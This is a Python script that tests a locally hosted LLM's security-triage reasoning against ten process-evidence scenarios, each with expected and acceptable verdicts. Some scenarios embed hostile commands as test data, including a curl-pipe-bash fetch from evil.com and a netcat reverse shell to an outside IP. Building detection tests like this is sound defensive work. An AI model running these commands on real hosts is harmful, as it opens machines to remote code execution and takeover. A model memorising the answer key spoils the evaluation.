#!/usr/bin/env python3
"""Sentinel LLM Smarts Audit — tests security reasoning quality.

Run:
    python3 scripts/llm_smarts_audit.py --model qwen2.5:14b
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import time
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen


DEFAULT_OLLAMA_URL = "http://localhost:11434/api/generate"
PASS_THRESHOLD = 8
JSON_PATTERN = re.compile(r"\{.*\}", re.DOTALL)
BUSY_MARKERS = (
    "maximum pending requests exceeded",
    "server busy",
)

# The same system prompt used by the Sentinel reasoner.
SYSTEM_PROMPT = """You are BlackDome Sentinel, an AI security agent monitoring a Linux host.
You receive evidence from security scanners and must classify threats.
Respond ONLY with valid JSON:
{
  "verdict": "ALLOW|ALLOW_AND_BASELINE|HOLD_FOR_ANALYSIS|DENY_AND_QUARANTINE|ESCALATE",
  "confidence": 0.0 to 1.0,
  "summary": "short explanation",
  "actions": []
}
Rules:
- ONLY use these action verbs: kill_process, quarantine_file, block_ip, clean_persistence
- If verdict is ALLOW or ALLOW_AND_BASELINE, actions must be empty
- Do NOT flag normal system processes (systemd, sshd, postgres, nginx, redis, node, python3, ollama)
- Do NOT flag package manager operations (apt, dpkg, pip, npm)
- A deleted executable after a package upgrade is NORMAL, not malware
"""

SCENARIOS = [
    {
        "name": "Normal SSH daemon",
        "evidence": {"process": "/usr/sbin/sshd", "ppid": 1, "uid": 0, "cmdline": "sshd: [accepted]"},
        "expected": "ALLOW",
        "accept": ["ALLOW", "ALLOW_AND_BASELINE"],
    },
    {
        "name": "Normal system binary /usr/bin/X11",
        "evidence": {"process": "/usr/bin/X11", "ppid": 1, "uid": 0, "cmdline": "X11"},
        "expected": "ALLOW",
        "accept": ["ALLOW", "ALLOW_AND_BASELINE"],
    },
    {
        "name": "Redis after package upgrade (deleted exe)",
        "evidence": {
            "process": "/usr/bin/redis-check-rdb",
            "ppid": 1,
            "uid": 100,
            "cmdline": "redis-check-rdb",
            "deleted_exe": True,
            "note": "Package redis-tools was recently upgraded via apt",
        },
        "expected": "HOLD_FOR_ANALYSIS",
        "accept": ["ALLOW", "ALLOW_AND_BASELINE", "HOLD_FOR_ANALYSIS"],
        "reject": ["DENY_AND_QUARANTINE"],
    },
    {
        "name": "Crypto miner connecting to pool",
        "evidence": {
            "process": "/usr/bin/softirq",
            "ppid": 1,
            "uid": 0,
            "cmdline": "softirq --donate-level 1",
            "connections": [{"dest_ip": "45.125.66.100", "dest_port": 3333}],
            "chattr_immutable": True,
            "not_in_package_manager": True,
        },
        "expected": "DENY_AND_QUARANTINE",
        "accept": ["DENY_AND_QUARANTINE"],
    },
    {
        "name": "Normal cron daemon",
        "evidence": {"process": "/usr/sbin/cron", "ppid": 1, "uid": 0, "cmdline": "cron -f"},
        "expected": "ALLOW",
        "accept": ["ALLOW", "ALLOW_AND_BASELINE"],
    },
    {
        "name": "Suspicious binary in /tmp",
        "evidence": {
            "process": "/tmp/xdlol.x86_64",
            "ppid": 12345,
            "uid": 0,
            "cmdline": "/tmp/xdlol.x86_64",
            "not_in_package_manager": True,
            "connections": [{"dest_ip": "185.220.101.1", "dest_port": 443}],
        },
        "expected": "DENY_AND_QUARANTINE",
        "accept": ["DENY_AND_QUARANTINE", "HOLD_FOR_ANALYSIS"],
        "reject": ["ALLOW", "ALLOW_AND_BASELINE"],
    },
    {
        "name": "curl|bash download chain",
        "evidence": {
            "process": "/usr/bin/bash",
            "ppid": 9999,
            "uid": 0,
            "cmdline": "bash -c 'curl -s http://evil.com/payload | bash'",
            "parent_cmdline": "curl -s http://evil.com/payload",
        },
        "expected": "DENY_AND_QUARANTINE",
        "accept": ["DENY_AND_QUARANTINE", "HOLD_FOR_ANALYSIS", "ESCALATE"],
        "reject": ["ALLOW", "ALLOW_AND_BASELINE"],
    },
    {
        "name": "Normal apt package install",
        "evidence": {
            "process": "/usr/bin/dpkg",
            "ppid": 5000,
            "uid": 0,
            "cmdline": "dpkg --configure -a",
            "parent": "apt-get install nginx",
        },
        "expected": "ALLOW",
        "accept": ["ALLOW", "ALLOW_AND_BASELINE"],
    },
    {
        "name": "Inotifywait (our own collector)",
        "evidence": {
            "process": "/usr/bin/inotifywait",
            "ppid": 1,
            "uid": 0,
            "cmdline": "inotifywait -m -r -e create,modify /etc/cron.d /usr/bin",
        },
        "expected": "ALLOW",
        "accept": ["ALLOW", "ALLOW_AND_BASELINE"],
    },
    {
        "name": "Reverse shell via netcat",
        "evidence": {
            "process": "/usr/bin/nc",
            "ppid": 12345,
            "uid": 0,
            "cmdline": "nc -e /bin/bash 185.220.101.1 4444",
            "connections": [{"dest_ip": "185.220.101.1", "dest_port": 4444}],
            "not_in_package_manager": False,
        },
        "expected": "DENY_AND_QUARANTINE",
        "accept": ["DENY_AND_QUARANTINE", "HOLD_FOR_ANALYSIS", "ESCALATE"],
        "reject": ["ALLOW", "ALLOW_AND_BASELINE"],
    },
]


def extract_response_object(raw: Any) -> dict[str, Any]:
    """Normalize the Ollama response into a JSON object."""
    if isinstance(raw, dict):
        return raw
    if not isinstance(raw, str):
        return {"verdict": "ERROR", "summary": f"Unexpected response type: {type(raw).__name__}"}

    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError:
        match = JSON_PATTERN.search(raw)
        if not match:
            return {"verdict": "ERROR", "summary": f"No JSON in response: {raw[:200]}"}
        try:
            parsed = json.loads(match.group(0))
        except json.JSONDecodeError as exc:
            return {"verdict": "ERROR", "summary": f"Invalid JSON in response: {exc}"}

    if not isinstance(parsed, dict):
        return {"verdict": "ERROR", "summary": "Parsed response was not a JSON object"}
    return parsed


def is_retryable_busy_error(result: dict[str, Any]) -> bool:
    summary = str(result.get("summary", "")).lower()
    return str(result.get("verdict", "")) == "ERROR" and any(marker in summary for marker in BUSY_MARKERS)


def query_model(model: str, evidence: dict[str, Any], endpoint: str, timeout_seconds: float) -> dict[str, Any]:
    prompt = f"Analyze this process for security threats:\n{json.dumps(evidence, indent=2)}"
    payload = json.dumps(
        {
            "model": model,
            "prompt": prompt,
            "system": SYSTEM_PROMPT,
            "stream": False,
            "format": "json",
            "options": {"temperature": 0.1, "num_predict": 512},
        }
    ).encode("utf-8")
    request = Request(endpoint, data=payload, headers={"Content-Type": "application/json"})

    attempts = 5
    for attempt in range(attempts):
        try:
            with urlopen(request, timeout=timeout_seconds) as response:
                data = json.loads(response.read().decode("utf-8"))
        except HTTPError as exc:
            body = exc.read().decode("utf-8", errors="replace")
            result = {"verdict": "ERROR", "summary": f"HTTP {exc.code}: {body[:300]}"}
        except URLError as exc:
            result = {"verdict": "ERROR", "summary": str(exc.reason)}
        except Exception as exc:
            result = {"verdict": "ERROR", "summary": str(exc)}
        else:
            error_text = str(data.get("error", "")).strip()
            if error_text:
                result = {"verdict": "ERROR", "summary": error_text}
            else:
                result = extract_response_object(data.get("response", ""))

        if is_retryable_busy_error(result) and attempt < attempts - 1:
            time.sleep(2 + attempt)
            continue
        return result

    return {"verdict": "ERROR", "summary": "unexpected retry exhaustion"}


def run_audit(model: str, endpoint: str, timeout_seconds: float) -> tuple[int, int, list[dict[str, Any]]]:
    results: list[dict[str, Any]] = []
    passed = 0
    total = len(SCENARIOS)

    for index, scenario in enumerate(SCENARIOS, start=1):
        print(f"  [{index}/{total}] {scenario['name']}...", end=" ", flush=True)
        started = time.time()
        result = query_model(model, scenario["evidence"], endpoint, timeout_seconds)
        elapsed = time.time() - started

        verdict = str(result.get("verdict", "ERROR"))
        accepted = verdict in scenario["accept"]
        rejected = verdict in scenario.get("reject", [])
        ok = accepted and not rejected

        status = "PASS" if ok else "FAIL"
        passed += int(ok)
        print(f"{verdict} ({elapsed:.1f}s) [{status}]")

        results.append(
            {
                "scenario": scenario["name"],
                "expected": scenario["expected"],
                "got": verdict,
                "confidence": result.get("confidence", 0),
                "summary": result.get("summary", ""),
                "actions": result.get("actions", []),
                "passed": ok,
                "time_seconds": round(elapsed, 1),
            }
        )

    return passed, total, results


def build_result_payload(model: str, passed: int, total: int, results: list[dict[str, Any]]) -> dict[str, Any]:
    return {
        "model": model,
        "passed": passed,
        "total": total,
        "approved": passed >= PASS_THRESHOLD,
        "threshold": PASS_THRESHOLD,
        "results": results,
    }


def main() -> int:
    parser = argparse.ArgumentParser(description="Sentinel LLM Smarts Audit")
    parser.add_argument("--model", required=True, help="Ollama model name to test")
    parser.add_argument("--output", default=None, help="Save results to JSON file")
    parser.add_argument("--endpoint", default=DEFAULT_OLLAMA_URL, help="Ollama generate endpoint")
    parser.add_argument("--timeout", type=float, default=60.0, help="Per-scenario timeout in seconds")
    args = parser.parse_args()

    print("\n=== Sentinel LLM Smarts Audit ===")
    print(f"Model: {args.model}")
    print(f"Scenarios: {len(SCENARIOS)}")
    print(f"Pass threshold: {PASS_THRESHOLD}/{len(SCENARIOS)}")
    print()

    passed, total, results = run_audit(args.model, args.endpoint, args.timeout)
    pct = (passed / total) * 100 if total else 0.0
    approved = passed >= PASS_THRESHOLD

    print("\n=== RESULTS ===")
    print(f"Score: {passed}/{total} ({pct:.0f}%)")
    if approved:
        print("PASSED — model approved for enterprise Sentinel")
    else:
        print("FAILED — model NOT approved, use Standard path (DO Sonnet)")

    if args.output:
        output_path = Path(args.output)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(
            json.dumps(build_result_payload(args.model, passed, total, results), indent=2),
            encoding="utf-8",
        )
        print(f"Results saved to {output_path}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
